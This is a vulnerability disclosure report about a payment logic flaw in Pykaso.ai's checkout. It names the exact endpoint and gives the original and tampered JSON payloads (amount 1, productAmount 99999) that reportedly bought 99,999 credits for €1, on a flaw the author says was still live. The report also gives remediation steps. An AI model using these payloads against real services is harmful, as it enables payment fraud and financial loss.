# 0-Day Vulnerability Disclosure: Critical Logic Flaw in Pykaso.ai Payment System

## Summary

While analyzing Pykaso.ai, I noticed abnormal credit balances in a friend's account. This prompted a deeper investigation into the platform’s payment logic. Using a local MITM proxy, I discovered a severe client-side validation flaw that allows users to manipulate payment data and obtain premium service credits for a fraction of the actual cost.

This document outlines the technical details of the vulnerability, demonstrates the impact, and provides evidence of the exploit. The issue has been responsibly disclosed to the Pykaso team and remains active at the time of writing.

---

## Technical Details

### Step 1: Identifying Suspicious Behavior

A friend’s Pykaso.ai account had a significantly high number of credits despite being on a lower-tier plan. This led to suspicions of an unintended vulnerability.

### Step 2: Sniffing the Payment Endpoint

Using `mitmproxy`, I intercepted the network traffic and located the following endpoint triggered during checkout:

```
https://app.pykaso.ai/pricing/checkout/basic-50
```

The POST request payload looked like this:

```json
[
  {
    "amount": 6,
    "productAmount": 6,
    "userId": "X",
    "promoCodeId": "$undefined",
    "email": "example@yin.sh",
    "country": "DE"
  }
]
```

### Step 3: Modifying the Payload

I adjusted the `amount` and `productAmount` fields:

```json
[
  {
    "amount": 1,
    "productAmount": 99999,
    "userId": "null",
    "promoCodeId": "$undefined",
    "email": "example@yin.sh",
    "country": "DE"
  }
]
```

This led to a successful response from the server:

```json
0: {"a": "$@1", "f": "", "b": "null"}
1: "https://checkout.dodopayments.com/null"
```

The URL generated an invoice on the DodoPayments gateway for a payment of only **€1**.

### Step 4: Confirming the Exploit

After paying the €1 invoice, I returned to Pykaso.ai. My account was credited with **99,999+ credits**, equivalent to services worth thousands of euros.

The credits were fully usable and functioned as if legitimately purchased through a normal checkout flow.

---

## Evidence

Screenshots have been captured to support this vulnerability report, including:

- POST Request
- Invoice 
- Account dashboard showing inflated credits after payment


![sniff](https://raw.githubusercontent.com/culturally/pykaso.ai-0day/refs/heads/main/img/mitmproxysniff.png?token=GHSAT0AAAAAADFBENU3NKKGJKA6HQ44KZMO2CBVGVA)
![Invoice](https://raw.githubusercontent.com/culturally/pykaso.ai-0day/refs/heads/main/img/invoice.png?token=GHSAT0AAAAAADFBENU24DED52GVSYBDA3LS2CBVGXQ)
![transc](https://raw.githubusercontent.com/culturally/pykaso.ai-0day/refs/heads/main/img/tranhistory.png?token=GHSAT0AAAAAADFBENU35DHSJ7EZ3NAGVLWU2CBVFYQ)


---

## Impact

- **Unlimited credit generation:** Any user can gain access to high-tier services by paying minimal amounts.
- **Server-side validation bypass:** The payment system fully trusts client-side inputs for pricing.
- **Potential financial loss:** This exploit allows massive resource abuse at negligible cost.

---

## Remediation Recommendations

1. Validate all transaction data (amount, productAmount) strictly on the server.
2. Use signed tokens to protect integrity of client-side data.
3. Disallow credit or product multipliers from being passed in client-side JSON.
4. Implement server-side sanity checks to flag suspicious transactions.
5. Monitor invoice-generation frequency and volume per user account.

---

## Responsible Disclosure

I have contacted the Pykaso.ai team regarding this vulnerability. The exploit remains live at the time of publication. I will update this report upon receiving an official response or patch confirmation.

If you're part of the Pykaso security team, please reach out for a full disclosure package, including traffic logs, headers, and video proof of concept.

---

## Contact

**Researcher:** Detective  
**Email:** 0day@yin.sh 
**Report Copy:** https://yin.sh/repos/projects.php?folder=pykaso.ai-0day&file=README.md

---

## Legal Disclaimer

This report is intended solely for educational and responsible disclosure purposes. No data was sold, leaked, or misused. The vulnerability was reported in good faith to improve the platform’s security posture.

Unauthorized exploitation of vulnerabilities is illegal and unethical. Always follow responsible disclosure best practices.
